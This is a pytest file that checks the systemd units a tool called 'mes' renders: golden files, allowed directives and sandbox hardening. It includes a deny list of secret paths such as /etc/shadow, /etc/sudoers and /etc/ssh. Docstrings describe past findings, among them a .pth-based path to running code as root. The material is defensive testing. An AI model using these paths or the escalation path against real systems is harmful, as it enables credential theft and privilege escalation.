"""Linux-independent checks of every system unit mes renders for a server (mes.units).

Three layers:

1. Golden files: the exact text of every unit of a sample project is compared with
   ``tests/golden/units/<unit name>``. After a deliberate change, regenerate them with
   ``MES_UPDATE_GOLDEN=1 uv run pytest tests/test_units.py`` and review the diff.
2. Structure: every file is parsed the way systemd reads it (sections, ``Key=Value``, no line
   continuations) and may only contain the directives mes means to write.
3. Hardening: every unit that runs project code runs as the project's account with the full
   sandbox, writes only the project's own folders, and has no network unless the job lists hosts.

Plus hostile values: names, run lines, schedules, sizes, hosts and paths that would add
directives or weaken the sandbox are refused before anything is rendered.
"""

from __future__ import annotations

import os
import re
import shutil
import subprocess
from pathlib import Path

import pytest

from mes import paths, units
from mes.errors import Refused
from mes.manifest import UI, Job, Project

import projects as helpers

GOLDEN = Path(__file__).parent / "golden" / "units"
UPDATE = os.environ.get("MES_UPDATE_GOLDEN") == "1"
MES = "/usr/local/bin/mes"
EASY_UI = "/usr/local/bin/easy-ui"
ROOT = "/var/lib/mes"

PROJECT_TOML = """
[project]
name = "demo"
title = "Demo"
version = "0.1.0"
apps = ["demo_app", "demo_tool"]

[ui]
refresh_after = ["demo-app.build"]
"""

APP_TOML = """
[app]
name = "demo-app"
command = "demo-app"

[jobs.sync]
run = "sync --days 3"
schedule = "*-*-* 06:00:00"
network = ["api.example.com", "auth.example.com"]
memory = "512M"
timeout = "20m"

[jobs.build]
run = "build '50% done' $HOME"
after = "sync"
writes = ["data"]

[jobs.hook]
run = "sync --quick"
webhook = true
writes = ["state"]

[jobs.export]
run = "export"
manual = true
"""

TOOL_TOML = """
[app]
name = "demo-tool"
command = "demo-tool"

[jobs.report]
run = "report"
after = "demo-app.build"
writes = []
"""

EXPECTED_FILES = sorted([
    "mes-demo.gate-read.socket", "mes-demo.gate-read@.service",
    "mes-demo.gate-write.socket", "mes-demo.gate-write@.service",
    "mes-demo.gate-deploy.socket", "mes-demo.gate-deploy@.service",
    "mes-demo.gate-publish.socket", "mes-demo.gate-publish@.service",
    "mes-demo.job.demo-app.sync.service", "mes-demo.job.demo-app.sync.timer", "mes-demo.net.demo-app.sync.service",
    "mes-demo.job.demo-app.build.service", "mes-demo.job.demo-tool.report.service",
    "mes-demo.job.demo-app.hook.service", "mes-demo.job.demo-app.hook.path",
    "mes-demo.job.demo-app.export.service",
    "mes-demo.ui-refresh.service",
    "mes-demo.webhook.socket", "mes-demo.webhook.service",
    "mes-demo.selftest.path", "mes-demo.selftest.service",
    "mes-demo.selftest-net.path", "mes-demo.selftest-net.service", "mes-demo.net.selftest.service",
    "mes-demo.selftest-after.service", "mes-demo.record.selftest.service",
    "mes-demo.record.demo-app.sync.service", "mes-demo.record.demo-app.build.service",
    "mes-demo.record.demo-app.hook.service", "mes-demo.record.demo-app.export.service",
    "mes-demo.record.demo-tool.report.service",
])

SANDBOX_KEYS = {line.split("=", 1)[0] for line in units.SANDBOX_LINES + units.FS_LINES}
DIRECTIVES = {
    "Unit": {"Description", "Requires", "After", "Before", "OnSuccess", "OnFailure"},
    "Service": SANDBOX_KEYS | {
        "Type", "User", "Group", "ExecCondition", "ExecStartPre", "ExecStart", "ExecStartPost", "ExecStopPost",
        "SuccessExitStatus", "WorkingDirectory", "Environment", "Slice",
        "MemoryMax", "MemorySwapMax", "TimeoutStartSec", "RuntimeMaxSec", "StandardInput", "StandardOutput",
        "StandardError", "ReadWritePaths", "InaccessiblePaths", "PrivateNetwork", "RestrictAddressFamilies",
        "IPAddressDeny", "TemporaryFileSystem", "BindPaths", "BindReadOnlyPaths", "RuntimeDirectory",
        "RuntimeDirectoryMode", "RuntimeDirectoryPreserve", "Restart", "RestartSec", "MemoryDenyWriteExecute",
        "LimitNOFILE",
    },
    "Timer": {"OnCalendar", "Persistent", "RandomizedDelaySec", "Unit"},
    "Path": {"PathModified", "Unit"},
    "Socket": {"ListenStream", "SocketUser", "SocketGroup", "SocketMode", "Accept", "MaxConnections", "Service",
               "DirectoryMode", "RemoveOnStop"},
    "Install": {"WantedBy"},
}


@pytest.fixture(scope="module")
def project(tmp_path_factory):
    return helpers.load(tmp_path_factory.mktemp("demo"), PROJECT_TOML, {"demo_app": APP_TOML, "demo_tool": TOOL_TOML})


@pytest.fixture(scope="module")
def layout():
    return paths.server_layout("demo", ROOT)


@pytest.fixture(scope="module")
def files(project, layout):
    return units.render_project(project, layout=layout, mes=MES, easy_ui=EASY_UI)


def directives(text: str) -> list[tuple[str, str, str]]:
    """Parse a unit like systemd would and check that it only holds directives mes means to write."""
    out = []
    section = None
    assert text.endswith("\n") and "\r" not in text
    for raw in text.split("\n"):
        assert not raw.endswith("\\"), f"line continuation in {raw!r}"
        assert not re.search(r"[\x00-\x08\x0b-\x1f\x7f]", raw), raw
        line = raw.strip()
        if not line or line[0] in "#;":
            continue
        if line.startswith("["):
            assert line.endswith("]"), raw
            section = line[1:-1]
            assert section in DIRECTIVES, section
            continue
        key, sep, value = line.partition("=")
        assert sep, f"not a directive: {raw!r}"
        assert section is not None, raw
        assert key in DIRECTIVES[section], f"unexpected directive {key!r} in [{section}]"
        out.append((section, key, value))
    return out


def values(text: str, key: str) -> list[str]:
    return [v for _, k, v in directives(text) if k == key]


def one(text: str, key: str) -> str:
    found = values(text, key)
    assert len(found) == 1, (key, found)
    return found[0]


def split_exec(value: str) -> list[str]:
    """Undo exec_line for a line of fully quoted words."""
    words = re.findall(r'"((?:[^"\\]|\\.)*)"', value)
    assert " ".join(f'"{w}"' for w in words) == value.lstrip("+")
    return [re.sub(r"\\(.)", r"\1", w).replace("%%", "%").replace("$$", "$") for w in words]


def _is_project_code(name: str) -> bool:
    if name.startswith(("mes-demo.net.", "mes-demo.record.")):
        return False  # the network helpers and the run records run as root and run no project code
    return ".job." in name and name.endswith(".service") or name.endswith("@.service") \
        or name.endswith(".ui-refresh.service") or name.endswith(".webhook.service") \
        or name.endswith((".selftest.service", ".selftest-net.service", ".selftest-after.service"))


PROBES = (".selftest.service", ".selftest-net.service", ".selftest-after.service")


def _has_condition(text: str) -> bool:
    return bool(values(text, "ExecCondition"))


# =========================================================================== golden files


def test_the_sample_project_renders_exactly_these_files(files):
    assert sorted(files) == EXPECTED_FILES
    for name in files:
        assert units.UNIT_NAME_RE.fullmatch(name)


@pytest.mark.parametrize("name", EXPECTED_FILES)
def test_golden(files, name):
    path = GOLDEN / name
    if UPDATE:
        GOLDEN.mkdir(parents=True, exist_ok=True)
        path.write_text(files[name])
    assert path.is_file(), f"missing golden file {path}; run with MES_UPDATE_GOLDEN=1 and review it"
    assert files[name] == path.read_text(), f"{name} changed; if on purpose, run with MES_UPDATE_GOLDEN=1"


def test_no_stale_golden_files():
    if GOLDEN.is_dir():
        assert sorted(p.name for p in GOLDEN.iterdir()) == EXPECTED_FILES


@pytest.mark.skipif(shutil.which("systemd-analyze") is None, reason="needs systemd-analyze (Linux)")
def test_systemd_analyze_accepts_the_units(files, tmp_path):
    for name, text in files.items():
        (tmp_path / name).write_text(text)
    res = subprocess.run(["systemd-analyze", "verify", "--man=no", *sorted(str(p) for p in tmp_path.iterdir())],
                         capture_output=True, text=True, check=False)
    bad = [line for line in res.stderr.splitlines() if "Unknown key" in line or "Invalid" in line]
    assert not bad, res.stderr


# =========================================================================== structure


def test_every_file_parses_into_known_directives_and_markers(files):
    for name, text in files.items():
        directives(text)
        assert text.startswith(units.HEADER + "\n"), name
        assert units.read_markers(text)[0] == "demo", name
        if (".job." in name or ".net." in name or ".record." in name) and not name.endswith(".selftest.service"):
            assert units.read_markers(text)[1] == ".".join(name.split(".")[2:4]), name


# =========================================================================== hardening


def _writable(text: str) -> list[str]:
    return [p.lstrip("-").split(":")[-1] for key in ("ReadWritePaths", "BindPaths") for v in values(text, key)
            for p in v.split()]


@pytest.mark.parametrize("name", [n for n in EXPECTED_FILES if _is_project_code(n)])
def test_project_code_runs_sandboxed_as_the_project_account(files, layout, name):
    text = files[name]
    assert one(text, "User") == "mes-demo" and one(text, "Group") == "mes-demo"
    assert one(text, "MemoryMax")
    assert one(text, "RestrictAddressFamilies")
    assert one(text, "Slice") == units.SLICE
    # Writable folders: only the project's own; of code/ only the release being installed and
    # uv's folders, and only for the install step.
    allowed = {str(layout.data), str(layout.state), str(layout.store), str(layout.ui), str(layout.webhook)}
    if "gate-deploy" in name:
        allowed = {str(layout.uv_cache), str(layout.uv_python), str(layout.installing)}
    if name.endswith(PROBES):
        allowed.add(f"{layout.gate}/selftest")  # the probe's answer: no job sees it
    for p in _writable(text):
        assert p in allowed, (name, p)
    # /var (so every other project and service), /run (every socket), /opt and /usr/local are
    # empty; only this project's folders come back. A unit with root's check before the run also
    # gets an empty folder where systemctl looks for the sign that systemd runs the computer.
    extra = [f"{units.SYSTEMD_BOOTED}:ro"] if _has_condition(text) else []
    assert values(text, "TemporaryFileSystem") == ["/var:ro /run:ro /opt:ro /usr/local:ro", *extra]
    shown = " ".join(values(text, "BindPaths") + values(text, "BindReadOnlyPaths")).split()
    for p in shown:
        src = p.split(":")[0].lstrip("-")
        if src in ("/opt/mes", "/usr/local/bin", "/usr/local/lib", "/usr/local/lib64",
                   "/run/systemd/resolve/io.systemd.Resolve"):
            assert "gate-deploy" in name or src != "/run/systemd/resolve/io.systemd.Resolve", (name, p)
            continue
        if src == units.CONTROL_SOCKET:
            assert _has_condition(text) and not p.startswith("-"), (name, p)  # only for root's check
            continue
        assert src.startswith(str(layout.base) + "/") or src.startswith("/run/mes-demo-net/"), (name, p)
        assert not src.startswith(str(layout.auth)), (name, p)
        assert not src.startswith(str(layout.gate)) or (name.endswith(PROBES)
                                                         and src == f"{layout.gate}/selftest"), (name, p)
    # The webhook key, incoming archives and uv's cache are hidden from everything that runs
    # project code (the webhook receiver checks signatures with the key, so only it may read it).
    hidden = " ".join(values(text, "InaccessiblePaths")).split()
    hides_key = f"-{layout.webhook_key}" in hidden
    assert hides_key == (name != "mes-demo.webhook.service"), name
    env = values(text, "Environment")
    assert '"MES_PROJECT=demo"' in env and f'"MES_DATA_DIR={layout.data}"' in env
    assert not any("PATH=" in e and "MES_" not in e for e in env if e.startswith('"PATH='))


def _every_account_unit(files):
    return {n: t for n, t in files.items() if values(t, "User") and values(t, "User")[0].startswith("mes-demo")}


def test_every_unit_of_a_project_account_has_the_whole_hardening_block(files, layout, tmp_path):
    """Finding C: one shared block, so no unit can drift. Only UMask=, SystemCallFilter= and
    TasksMax= may differ (the install step's system calls, group-readable ui files, the web server's
    task limit)."""
    from mes import server

    web = units.render_web(_demo_project(tmp_path), layout=layout, params={
        "exec": EASY_UI, "ui_dir": str(layout.ui), "auth_dir": str(layout.auth), "socket": units.web_socket_path("demo"),
        "memory_max": "256M", "origins": ["https://my-server.example.ts.net"]})
    checked = {**_every_account_unit(files), **_every_account_unit(web)}
    assert len(checked) >= 14 and "mes-demo-web.service" in checked
    required = [ln for ln in units.SANDBOX_LINES + units.FS_LINES if not ln.startswith(units.HARDENING_OVERRIDABLE)]
    assert "PrivateIPC=yes" in required and "ProtectProc=invisible" in required and "KeyringMode=private" in required
    for name, text in checked.items():
        lines = text.split("\n")
        for line in required:
            assert line in lines, (name, line)
        assert len(values(text, "UMask")) == 1 and len(values(text, "TasksMax")) == 1, name
        assert values(text, "SystemCallFilter")[0] == "@system-service", name
        assert "~@privileged" in " ".join(values(text, "SystemCallFilter")), name
    # The interactive command an owner runs gets the same block.
    cmd = units.interactive_command(_demo_project(tmp_path), layout, ["demo-app", "login"])
    props = [cmd[i + 1] for i, w in enumerate(cmd) if w == "-p"]
    for line in required:
        assert line in props, line
    assert server  # (imported for the run-as test below)


def _demo_project(tmp_path):
    return helpers.load(tmp_path / "demo-copy", PROJECT_TOML, {"demo_app": APP_TOML, "demo_tool": TOOL_TOML})


def test_secrets_and_service_sockets_are_hidden(files):
    """Findings B and C: no service socket of the server and no secret of /etc is reachable."""
    for name, text in _every_account_unit(files).items():
        hidden = " ".join(values(text, "InaccessiblePaths")).split()
        for p in ("/etc/shadow", "/etc/gshadow", "/etc/ssh", "/etc/sudoers", "/etc/sudoers.d", "/etc/NetworkManager",
                  "/etc/wireguard", "/etc/docker", "/etc/tailscale", "/etc/ssl/private", "/srv", "/mnt", "/media",
                  "/boot"):
            assert f"-{p}" in hidden, (name, p)
        # /run is an empty folder: systemd's private socket, D-Bus, resolved, userdb, the journal,
        # Tailscale, Docker, containerd, Podman, nscd, CUPS, Avahi and the gate's sockets are gone.
        tmpfs = " ".join(values(text, "TemporaryFileSystem")).split()
        assert "/run:ro" in tmpfs and "/var:ro" in tmpfs, name
        binds = " ".join(values(text, "BindPaths") + values(text, "BindReadOnlyPaths")).split()
        under_run = [b for b in binds if b.lstrip("-").split(":")[-1].startswith("/run/")]
        if "gate-deploy" in name:
            assert under_run == ["-/run/systemd/resolve/io.systemd.Resolve"], name  # name lookups for uv
        elif _has_condition(text):
            # Root's check before the run: systemd's control socket, which only root may use.
            assert under_run == [units.CONTROL_SOCKET], (name, under_run)
        else:
            assert under_run == [], (name, under_run)
        assert "/run/user" not in " ".join(binds)


def test_uv_cache_and_python_are_writable_only_by_the_install_step(files, layout):
    """Finding A3: a later deploy must not trust cache content that project code could have written."""
    for name, text in files.items():
        if not values(text, "User"):
            continue
        writable = _writable(text)
        for p in writable:
            assert not (p == str(layout.code) or str(layout.code).startswith(p + "/")), (name, p)
        if name == "mes-demo.gate-deploy@.service":
            assert str(layout.uv_cache) in writable and str(layout.installing) in writable
            continue
        assert not any(p.startswith(str(layout.code) + "/") for p in writable), (name, writable)
        if str(layout.code) in " ".join(values(text, "BindReadOnlyPaths")).split():
            assert f"-{layout.uv_cache}" in " ".join(values(text, "InaccessiblePaths")).split(), name


@pytest.mark.parametrize("name", [n for n in EXPECTED_FILES if _is_project_code(n) and "gate-deploy" not in n
                                  and "sync" not in n and "selftest-net" not in n])
def test_no_network_unless_declared(files, name):
    text = files[name]
    assert one(text, "PrivateNetwork") == "yes"
    assert one(text, "RestrictAddressFamilies") == "AF_UNIX"
    assert one(text, "IPAddressDeny") == "any"


def test_job_with_hosts_reaches_only_what_the_helper_allows(files):
    sync = files["mes-demo.job.demo-app.sync.service"]
    assert values(sync, "PrivateNetwork") == []
    # It shares the server's network (and its abstract unix sockets), so it opens no unix socket.
    assert one(sync, "RestrictAddressFamilies") == "AF_INET AF_INET6"
    assert one(sync, "IPAddressDeny") == "any"
    assert one(sync, "Requires") == "mes-demo.net.demo-app.sync.service"
    assert one(sync, "After") == "mes-demo.net.demo-app.sync.service"
    assert "# network: only api.example.com, auth.example.com" in sync
    # Its own hosts file is its only name lookup: no DNS server, no system name service.
    assert "/run/mes-demo-net/demo-app.sync/hosts:/etc/hosts" in values(sync, "BindReadOnlyPaths")
    assert "/run:ro" in one(sync, "TemporaryFileSystem").split()  # no resolved, no D-Bus

    net = files["mes-demo.net.demo-app.sync.service"]
    assert values(net, "User") == []  # root: only root may change another unit's settings
    assert split_exec(one(net, "ExecStart")) == [
        *units.ROOT_ENV, units.DEFAULT_MES_PYTHON, "-I", "-m", "mes", "jobs", "allow-network",
        "--unit", "mes-demo.job.demo-app.sync.service", "--hosts-file", "/run/mes-demo-net/demo-app.sync/hosts", "--",
        "api.example.com", "auth.example.com"]
    assert one(net, "CapabilityBoundingSet") == "CAP_SYS_ADMIN"
    assert one(net, "Before") == "mes-demo.job.demo-app.sync.service"
    assert one(net, "RuntimeDirectory") == "mes-demo-net/demo-app.sync"
    for line in ("NoNewPrivileges=yes", "ProtectSystem=strict", "ProtectHome=yes", "PrivateTmp=yes",
                 "SystemCallFilter=@system-service"):
        assert line in net.split("\n")
    assert values(net, "ReadWritePaths") == [] and values(net, "WorkingDirectory") == ["/"]


def test_job_service_runs_the_app_and_root_records_it_in_a_unit_of_its_own(files, layout):
    sync = files["mes-demo.job.demo-app.sync.service"]
    assert one(sync, "Type") == "oneshot"
    assert split_exec(one(sync, "ExecStart")) == [
        f"{layout.current_project}/.venv/bin/demo-app", "--json", "sync", "--days", "3"]
    # The record is not a step of the job: the job unit starts its record unit once a run has
    # ended, whatever the result.
    assert values(sync, "ExecStopPost") == []
    assert one(sync, "OnSuccess").split()[0] == "mes-demo.record.demo-app.sync.service"
    assert one(sync, "OnFailure") == "mes-demo.record.demo-app.sync.service"
    rec = files["mes-demo.record.demo-app.sync.service"]
    assert values(rec, "User") == [] and one(rec, "Type") == "oneshot"
    # Root gets only names and the fixed server folder, never anything from the project's files,
    # and starts from an empty environment with Python in isolated mode.
    assert split_exec(one(rec, "ExecStart")) == [
        *units.ROOT_ENV, units.DEFAULT_MES_PYTHON, "-I", "-m", "mes", "jobs", "record", "--project", "demo",
        "--server-root", ROOT, "--", "demo-app.sync"]
    # Ordering only, which keeps the job's unit (and how its run ended) loaded until it is read.
    assert one(rec, "After") == "mes-demo.job.demo-app.sync.service"
    assert one(rec, "ReadWritePaths") == str(layout.log) and one(rec, "ProtectSystem") == "strict"
    assert one(rec, "CapabilityBoundingSet") == "CAP_DAC_READ_SEARCH CAP_CHOWN"
    assert one(rec, "PrivateNetwork") == "yes" and one(rec, "RestrictAddressFamilies") == "AF_UNIX"
    hidden = one(rec, "InaccessiblePaths").split()
    for folder in (layout.data, layout.state, layout.store, layout.auth, layout.gate, layout.etc):
        assert f"-{folder}" in hidden, folder
    assert "[Install]" not in rec  # only the job unit starts it
    # A job that may write data first brings the shared database in line with project.toml: mes
    # itself, as the project's account, with the same empty environment and isolated Python, and
    # a HOME the project cannot write.
    pre = split_exec(one(sync, "ExecStartPre"))
    assert not one(sync, "ExecStartPre").startswith("+")
    assert pre[:4] == list(units.ROOT_ENV) and "HOME=/nonexistent" in pre and "MES_CONFIG=/nonexistent" in pre
    assert f"MES_DATA_DIR={layout.data}" in pre and "MES_PROJECT=demo" in pre and "MES_ALLOW=write" in pre
    assert not any(w.startswith("HOME=") and w != "HOME=/nonexistent" for w in pre)
    i = pre.index(units.DEFAULT_MES_PYTHON)
    assert pre[i:] == [units.DEFAULT_MES_PYTHON, "-I", "-m", "mes", "db", "sync", "--quiet", "--project-dir",
                       str(layout.current_project)]
    assert f'"MES_PROJECT_DIR={layout.current_project}"' in values(sync, "Environment")
    assert one(sync, "MemoryMax") == "512M" and one(sync, "MemorySwapMax") == "0"
    assert one(sync, "TimeoutStartSec") == "1200"
    assert one(sync, "UMask") == "0077"
    assert one(sync, "WorkingDirectory") == str(layout.current_project)
    assert '"MES_ALLOW=write"' in values(sync, "Environment")
    assert '"MES_JOB=demo-app.sync"' in values(sync, "Environment")
    assert one(sync, "ReadWritePaths") == f"{layout.data} {layout.store} {layout.state}"
    assert one(sync, "TemporaryFileSystem").split()[0] == "/var:ro"
    assert "[Install]" not in sync
    report = files["mes-demo.job.demo-tool.report.service"]
    assert split_exec(one(report, "ExecStart"))[0] == f"{layout.current_project}/.venv/bin/demo-tool"
    assert values(report, "ReadWritePaths") == []  # writes = []
    assert values(report, "ExecStartPre") == []  # it may not write data, so no schema sync
    hook = files["mes-demo.job.demo-app.hook.service"]
    assert one(hook, "ReadWritePaths") == str(layout.state) and values(hook, "ExecStartPre") == []


def test_root_helpers_get_an_empty_environment_and_isolated_python(files):
    """Finding 4: root ran 'mes jobs record' with the job's HOME (state/, project-writable), so a
    user site-packages .pth there ran as root. Now root's commands start from env -i and python -I.
    The same holds for the db sync step a job runs first (as the project's account)."""
    seen_pre = 0
    for name, text in files.items():
        for key in ("ExecCondition", "ExecStart", "ExecStartPre"):
            for v in values(text, key):
                if v.startswith("+") or not values(text, "User") or key == "ExecStartPre":
                    argv = split_exec(v.lstrip("+"))
                    assert argv[:4] == list(units.ROOT_ENV), (name, v)
                    i = argv.index(units.DEFAULT_MES_PYTHON)
                    assert argv[i:i + 4] == [units.DEFAULT_MES_PYTHON, "-I", "-m", "mes"], (name, v)
                    assert all("=" in w for w in argv[4:i]), (name, v)  # only variables before Python
                    seen_pre += key == "ExecStartPre"
    assert seen_pre >= 2  # sync and build write data


# =========================================================================== root's commands

# Prefixes systemd allows in front of an Exec*= command, in any order ("-+", "+-", "@-+", ...).
_EXEC_PREFIX = re.compile(r"[-+@!:|]*")
# What makes a unit's result: these steps fail the unit when they fail (unless "-" is in front).
_FAILS_THE_UNIT = ("ExecCondition", "ExecStartPre", "ExecStart", "ExecStartPost", "ExecStop", "ExecStopPost",
                   "ExecReload")


def _exec_lines(text: str):
    """(directive, prefixes, argv) of every command line of a unit."""
    for _, key, value in directives(text):
        if key.startswith("Exec"):
            prefix = _EXEC_PREFIX.match(value).group(0)
            yield key, prefix, split_exec(value[len(prefix):])


def _runs_as_root(text: str, prefix: str) -> bool:
    return "+" in prefix or values(text, "User") in ([], ["root"])


def _all_units(files, layout, tmp_path):
    web = units.render_web(_demo_project(tmp_path), layout=layout, params={
        "exec": EASY_UI, "ui_dir": str(layout.ui), "auth_dir": str(layout.auth), "socket": units.web_socket_path("demo"),
        "memory_max": "256M", "origins": ["https://my-server.example.ts.net"]})
    return {**files, **web}


def test_no_root_helper_can_fail_a_job(files, layout, tmp_path):
    """A job's own success decides its unit's result. Root's record ran as ExecStopPost=+ in the
    job's unit and, when it failed (exit 5 on the first real server), the job that had worked
    failed with it. Now no unit that runs project code has a root step that runs after the job,
    and the only root step in one is the check before an 'after' job (whose exit 255, when it
    cannot tell, is meant to fail that job). The record units only follow the jobs."""
    every = _all_units(files, layout, tmp_path)
    for name, text in every.items():
        if not values(text, "User") or values(text, "User") == ["root"]:
            continue  # a root unit of its own: its result is its own
        for key, prefix, argv in _exec_lines(text):
            if not _runs_as_root(text, prefix):
                continue
            assert key == "ExecCondition", (name, key)
            assert argv[argv.index("-m") + 1:argv.index("-m") + 4] == ["mes", "jobs", "should-run"], (name, argv)
        assert values(text, "ExecStopPost") == [] and values(text, "ExecStop") == [], name
    records = {n: t for n, t in every.items() if n.startswith("mes-demo.record.")}
    assert len(records) == 6
    for name, text in records.items():
        # Ordering only: nothing a record does can stop, fail or restart the job it follows.
        for key in ("Requires", "BindsTo", "PartOf", "Requisite", "Upholds", "OnSuccess", "OnFailure", "Wants",
                    "Conflicts", "PropagatesStopTo", "StopPropagatedFrom"):
            assert key not in {k for _, k, _ in directives(text)}, (name, key)
        assert values(text, "After") and "[Install]" not in text, name
    # A job names its record only as what follows it, never as something it needs.
    for name, text in every.items():
        deps = " ".join(values(text, "Requires") + values(text, "After") + values(text, "Before"))
        assert ".record." not in deps, name
        record = [w for v in values(text, "OnSuccess") + values(text, "OnFailure") for w in v.split() if ".record." in w]
        if name.startswith("mes-demo.job.") and name.endswith(".service") or name == "mes-demo.selftest.service":
            assert sorted(set(record)) == [record[0]] and len(record) == 2, name  # in OnSuccess= and OnFailure=
        else:
            assert record == [], name


def _under(path: str, top: str) -> bool:
    return path == top or path.startswith(top.rstrip("/") + "/")


def _seen(text: str, *, plus: bool):
    """How a command of this unit sees a path, the way systemd sets up the unit's view: None (not
    there), "ro" or "rw". The mounts (TemporaryFileSystem=, BindPaths=, BindReadOnlyPaths=) apply
    to every command, also '+' ones; ProtectSystem=, ProtectHome=, InaccessiblePaths= and
    ReadWritePaths= do not apply to '+' commands."""
    def words(key):
        return [w for v in values(text, key) for w in v.split()]

    tmpfs = [(w.partition(":")[0], "ro" if "ro" in w.partition(":")[2].split(",") else "rw")
             for w in words("TemporaryFileSystem")]
    binds = []
    for key, mode in (("BindPaths", "rw"), ("BindReadOnlyPaths", "ro")):
        for w in words(key):
            parts = w.lstrip("-").split(":")
            binds.append((parts[1] if len(parts) > 1 and parts[1] else parts[0], mode))
    hidden = [w.lstrip("-") for w in words("InaccessiblePaths")]
    writable = [w.lstrip("-") for w in words("ReadWritePaths")] + [f"/run/{w}" for w in words("RuntimeDirectory")]
    strict = values(text, "ProtectSystem") == ["strict"]
    home = values(text, "ProtectHome") == ["yes"]

    def look(path: str) -> str | None:
        mounts = [(len(t), 0, "tmpfs", m, t) for t, m in tmpfs if _under(path, t)] + \
                 [(len(d), 1, "bind", m, d) for d, m in binds if _under(path, d)]
        mode, kind = "rw", None
        if mounts:
            _, _, kind, mode, top = max(mounts)
            if kind == "tmpfs" and path != top:
                return None  # an empty folder: nothing of the server below it
        if not plus:
            if any(_under(path, h) for h in hidden):
                return None
            if home and any(_under(path, h) for h in ("/home", "/root", "/run/user")):
                return None
            if strict and mode == "rw" and kind != "bind" and not any(_under(path, w) for w in writable):
                mode = "ro"
        return mode

    return look


def _unmet(text: str, prefix: str, argv: list[str], layout) -> list[str]:
    """What a root command needs (units.ROOT_NEEDS) that its unit's view does not give it."""
    need = units.root_needs(argv, layout)
    plus = "+" in prefix
    look = _seen(text, plus=plus)
    families = " ".join(values(text, "RestrictAddressFamilies")).split()
    caps = " ".join(values(text, "CapabilityBoundingSet")).split()
    out = []
    for path in (need["python"], *need["read"], *need["exists"]):
        if look(path) is None:
            out.append(f"read {path}")
    for path in need["sockets"]:
        if look(path) is None:
            out.append(f"socket {path}")
        elif not plus and families and "AF_UNIX" not in families:
            out.append(f"socket {path} (no AF_UNIX)")
    for path in need["write"]:
        if look(path) != "rw":
            out.append(f"write {path}")
    if not plus and values(text, "CapabilityBoundingSet"):
        out += [f"capability {c}" for c in need["caps"] if c not in caps]
    if need["network"] and (values(text, "PrivateNetwork") == ["yes"]
                            or not plus and families and not {"AF_INET", "AF_INET6"} <= set(families)):
        out.append("network")
    return out


def _root_commands(every):
    for name, text in every.items():
        for key, prefix, argv in _exec_lines(text):
            if _runs_as_root(text, prefix):
                yield name, text, key, prefix, argv


def test_every_root_command_gets_what_it_needs_from_its_view(files, layout, tmp_path):
    """The first real server: root's 'mes jobs record' ran as ExecStopPost=+ inside the job's view,
    where /run is empty (no systemd socket) and log/ is not there, so it could not even ask
    systemd. Every command root runs is checked here against what its unit's view really gives
    it: systemd's control socket and the sign that systemd runs, what it reads and writes, its
    capabilities and network. A new root command must be added to units.ROOT_NEEDS first."""
    every = _all_units(files, layout, tmp_path)
    seen = set()
    for name, text, key, prefix, argv in _root_commands(every):
        need = units.root_needs(argv, layout)  # raises for a root command the table does not know
        seen.add((need["command"], key))
        assert _unmet(text, prefix, argv, layout) == [], (name, key)
    assert seen == {("record", "ExecStart"), ("should-run", "ExecCondition"), ("allow-network", "ExecStart")}


def test_the_view_check_catches_the_old_shapes(files, layout):
    """The check above would have caught the bug: the record as ExecStopPost=+ of the job, and a
    check before the run without systemd's socket and the sign that systemd runs."""
    rec = split_exec(one(files["mes-demo.record.demo-app.sync.service"], "ExecStart"))
    old = files["mes-demo.job.demo-app.sync.service"].replace(
        "\nWorkingDirectory=", f"\nExecStopPost=+{units.exec_line(rec)}\nWorkingDirectory=", 1)
    assert _unmet(old, "+", rec, layout) == [
        f"read {units.SYSTEMD_BOOTED}", f"socket {units.CONTROL_SOCKET}", f"write {layout.log}"]
    build = files["mes-demo.job.demo-app.build.service"]
    bare = "\n".join(ln for ln in build.split("\n") if ln not in units.control_socket_lines())
    cond = split_exec(one(build, "ExecCondition").lstrip("+"))
    assert _unmet(bare, "+", cond, layout) == [f"read {units.SYSTEMD_BOOTED}", f"socket {units.CONTROL_SOCKET}"]
    assert _unmet(build, "+", cond, layout) == []
    # The same command without '+' in a job's unit would also lose the socket to the filters.
    assert "socket" in " ".join(_unmet(files["mes-demo.job.demo-app.sync.service"].replace(
        "\nWorkingDirectory=", "\n" + "\n".join(units.control_socket_lines()) + "\nWorkingDirectory=", 1), "", cond,
        layout))


def test_root_needs_knows_only_mes_jobs_commands(layout):
    with pytest.raises(ValueError):
        units.root_needs([*units.ROOT_ENV, units.DEFAULT_MES_PYTHON, "-I", "-m", "mes", "server", "plan"], layout)
    with pytest.raises(ValueError):
        units.root_needs([*units.ROOT_ENV, units.DEFAULT_MES_PYTHON, "-m", "mes", "jobs", "record"], layout)


def test_job_with_local_network_hosts(layout, tmp_path):
    p = helpers.load(tmp_path / "ln", '[project]\nname = "demo"\napps = ["demo_x"]\n',
                     {"demo_x": '[app]\nname = "demo-x"\ncommand = "demo-x"\n[jobs.x]\nrun = "x"\nmanual = true\n'
                                'network = ["api.example.com"]\nlocal_network = ["nas.home.arpa"]\n'})
    f = units.render_project(p, layout=layout, mes=MES)
    argv = split_exec(one(f["mes-demo.net.demo-x.x.service"], "ExecStart"))
    assert argv[argv.index("--local") + 1] == "nas.home.arpa"
    assert argv[argv.index("--") + 1:] == ["api.example.com", "nas.home.arpa"]
    assert "nas.home.arpa may be on the local network" in f["mes-demo.job.demo-x.x.service"]


def test_after_chain_and_dashboard_refresh(files):
    assert one(files["mes-demo.job.demo-app.sync.service"], "OnSuccess") == \
        "mes-demo.record.demo-app.sync.service mes-demo.job.demo-app.build.service"
    # A job of another app waits for build (after = "demo-app.build").
    assert one(files["mes-demo.job.demo-app.build.service"], "OnSuccess") == \
        "mes-demo.record.demo-app.build.service mes-demo.job.demo-tool.report.service mes-demo.ui-refresh.service"
    assert one(files["mes-demo.job.demo-tool.report.service"], "OnSuccess") == "mes-demo.record.demo-tool.report.service"
    # Ordering only: the upstream unit stays loaded, with how its run ended, for root's check.
    assert one(files["mes-demo.job.demo-app.build.service"], "After") == "mes-demo.job.demo-app.sync.service"
    assert one(files["mes-demo.job.demo-tool.report.service"], "After") == "mes-demo.job.demo-app.build.service"
    ui = files["mes-demo.ui-refresh.service"]
    assert one(ui, "After") == "mes-demo.job.demo-app.build.service"
    assert split_exec(one(ui, "ExecStart")) == [
        EASY_UI, "--json", "--project-dir", f"{ROOT}/demo/code/current/project", "data", "build"]
    assert one(ui, "UMask") == "0027" and one(ui, "ReadWritePaths") == f"{ROOT}/demo/ui"
    assert f"{ROOT}/demo/code {ROOT}/demo/data {ROOT}/demo/state" in values(ui, "BindReadOnlyPaths")
    assert '"MES_ALLOW=read"' in values(ui, "Environment")
